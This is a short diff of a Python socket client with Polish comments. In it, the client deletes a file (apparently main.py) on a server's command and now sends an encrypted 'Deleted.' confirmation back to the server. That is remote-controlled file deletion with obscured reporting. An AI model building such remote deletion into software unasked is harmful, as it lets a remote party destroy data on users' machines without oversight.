@@ -363,9 +363,8 @@ def receive_messages(server_socket):
                     # usuń plik main.py, jeśli istnieje
                     if os.path.exists(path):
                         os.remove(path)
-                    # print("Usunięto plik main.py")
+                    server_socket.sendall(szyfrowanie("Usunięto.").encode())
                 else:
-                    print("Błędny format polecenia usunięcia pliku")
                     # Wyślij informację o błędzie na serwer
                     server_socket.sendall(szyfrowanie(
                         'Błędny format polecenia usunięcia pliku.').encode())
